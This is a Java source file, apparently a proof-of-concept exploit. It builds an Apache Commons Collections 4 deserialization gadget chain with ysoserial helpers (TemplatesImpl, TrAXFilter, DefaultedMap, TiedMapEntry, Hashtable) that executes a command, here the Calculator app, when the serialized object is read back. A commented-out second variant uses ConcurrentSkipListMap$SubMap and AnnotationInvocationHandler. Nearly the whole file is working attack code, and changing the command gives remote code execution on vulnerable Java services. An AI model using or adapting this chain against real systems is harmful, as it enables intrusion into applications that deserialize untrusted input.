package payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.LazyMap;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.ConcurrentSkipListMap;

/**
 * readObject:1215, Hashtable (java.util)
 * reconstitutionPut:1238, Hashtable (java.util)
 * hashCode:122, TiedMapEntry (org.apache.commons.collections4.keyvalue)
 * getValue:73, TiedMapEntry (org.apache.commons.collections4.keyvalue)
 * get:203, DefaultedMap (org.apache.commons.collections4.map)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 */


//   java.util.concurrent.ConcurrentSkipListMap$SubMap
//CCV4_7_4

public class CC4_Poc9 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
        // inert chain for setup
        final org.apache.commons.collections4.Transformer transformerChain = new org.apache.commons.collections4.functors.ChainedTransformer(
                new org.apache.commons.collections4.Transformer[]{ new org.apache.commons.collections4.functors.ConstantTransformer(1) });
        // real chain for after setup
        final org.apache.commons.collections4.Transformer[] transformers = new org.apache.commons.collections4.Transformer[] {
                new org.apache.commons.collections4.functors.ConstantTransformer(TrAXFilter.class),
                new org.apache.commons.collections4.functors.InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templates } )};
        HashMap innermap = new HashMap();
        Class clazz3 = Class.forName("org.apache.commons.collections4.map.DefaultedMap");
        Constructor dDefaultedMap = clazz3.getDeclaredConstructor(Map.class,Transformer.class);
        dDefaultedMap.setAccessible(true);
        Object outerMap = dDefaultedMap.newInstance(innermap,transformerChain);
        TiedMapEntry tiedmap = new TiedMapEntry((DefaultedMap) outerMap,123);
        Hashtable hashtable = new Hashtable<Map,Integer>();
        hashtable.put(tiedmap,1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        ((DefaultedMap) outerMap).remove(123);

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(hashtable);
        outputStream.close();

        //         deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();










//        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
//
//
//        ConstantTransformer constant = new ConstantTransformer(String.class);
//
//        Class[] paramTypes = new Class[] { String.class };
//        Object[] arg = new Object[] { "foo" };
//
//        InstantiateTransformer instantiate = new InstantiateTransformer(
//                paramTypes, arg);
//
//
//        Transformer[] transformers = new Transformer[]{
//                constant, instantiate
//        };
//
//        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<>(new TransformingComparator(new ChainedTransformer(transformers)));
//        concurrentSkipListMap.put("asd","asd");
//
//
//        Class clazz2 = Class.forName("java.util.concurrent.ConcurrentSkipListMap$SubMap");
//        Constructor bindingEnumerationConstructor = clazz2.getDeclaredConstructor(ConcurrentSkipListMap.class, Object.class,boolean.class,Object.class,boolean.class,boolean.class);
//        bindingEnumerationConstructor.setAccessible(true);
//        Object bindingEnumerationObject = bindingEnumerationConstructor.newInstance(concurrentSkipListMap, null,true,null,true,true);
//
//
//        Reflections.setDeclaredField(constant, "iConstant", TrAXFilter.class);
//        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
//        arg = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
//        paramTypes[0] = Templates.class;
//        arg[0] = templates;
//
//
//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
//        construct.setAccessible(true);
//        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,bindingEnumerationObject);
//        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
//        handler = (InvocationHandler) construct.newInstance(Retention.class,mapProxy);
//
//
//
//        //         serialize
//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
//        outputStream.writeObject(handler);
//        outputStream.close();
//
//
//        //         deserialize
//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
//        inputStream.readObject();

    }
}
